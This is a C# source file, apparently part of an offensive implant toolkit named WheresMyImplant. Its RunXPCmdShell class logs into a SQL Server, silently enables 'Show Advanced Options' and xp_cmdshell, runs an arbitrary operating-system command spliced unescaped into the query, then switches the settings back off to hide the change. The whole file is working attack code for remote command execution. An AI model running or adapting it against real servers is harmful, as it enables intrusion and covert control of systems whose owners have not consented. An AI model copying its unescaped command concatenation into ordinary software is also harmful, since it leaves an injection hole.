using System;
using System.Collections.ObjectModel;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text;


using System.Reflection;

namespace WheresMyImplant
{
    class RunXPCmdShell : BaseSQL
    {
        internal RunXPCmdShell(string server, string database, string username, string password, string command) : base(server, database, username, password)
        {
            Boolean sp_configure_advanced = false;
            Boolean sp_configure_cmdshell = false;

            
            WriteOutputNeutral("Connection String: " + connectionString);
            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral("Testing if xp_cmdshell is enabled");
            if ("0" == ExecuteQuery("sp_configure 'xp_cmdshell'").TrimEnd())
            {
                WriteOutputBad("xp_cmdshell is disabled");
                WriteOutputNeutral("Attempting to enable");
                ////////////////////////////////////////////////////////////////////////////////
                if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'").TrimEnd())
                {
                    WriteOutputBad("Show Advanced Options is disabled");
                    ////////////////////////////////////////////////////////////////////////////////
                    WriteOutputNeutral("Attempting to enable Show Advanced Options");
                    ExecuteQuery("sp_configure 'Show Advanced Options',1;RECONFIGURE");
                    if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'"))
                    {
                        WriteOutputBad("Enabling Show Advanced Options failed");
                    }
                    else
                    {
                        WriteOutputGood("Enabling Show Advanced Options succeeded");
                        sp_configure_advanced = true;
                    }
                }
                ////////////////////////////////////////////////////////////////////////////////
                WriteOutputNeutral("Attempting to enable xp_cmdshell");
                if ("0" == ExecuteQuery("sp_configure 'xp_cmdshell',1;RECONFIGURE").TrimEnd())
                {
                    WriteOutputBad("Enabling xp_cmdshell failed");
                }
                else
                {
                    WriteOutputGood("Enabling xp_cmdshell succeeded");
                    sp_configure_cmdshell = true;
                }
            }
            else
            {
                WriteOutputGood("xp_cmdshell is enabled");
            }
            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputGood("Executing query");
            WriteOutputGood(ExecuteQuery("EXEC master..xp_cmdshell '" + command + "'").TrimEnd());
            WriteOutputGood("Query completed");
            ////////////////////////////////////////////////////////////////////////////////
            if (sp_configure_cmdshell)
            {
                WriteOutputNeutral("Attempting to disable xp_cmdshell");
                ExecuteQuery("sp_configure 'xp_cmdshell',0;RECONFIGURE");
                if ("0" == ExecuteQuery("sp_configure 'xp_cmdshell'"))
                {
                    WriteOutputGood("Disabling xp_cmdshell succeeded");
                }
                else
                {
                    WriteOutputBad("Disabling xp_cmdshell failed");
                    WriteOutputBad("sp_configure 'xp_cmdshell',0;RECONFIGURE");
                }
            }
            ////////////////////////////////////////////////////////////////////////////////
            if (sp_configure_advanced)
            {
                WriteOutputNeutral("Attempting to disable xp_cmdshell");
                ExecuteQuery("sp_configure 'Show Advanced Options',0;RECONFIGURE");
                if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'"))
                {
                    WriteOutputGood("Disabling Show Advanced Options succeeded");
                }
                else
                {
                    WriteOutputBad("Disabling Show Advanced Options failed");
                    WriteOutputBad("sp_configure 'Show Advanced Options',0;RECONFIGURE");
                }
            }
        }
    }
}
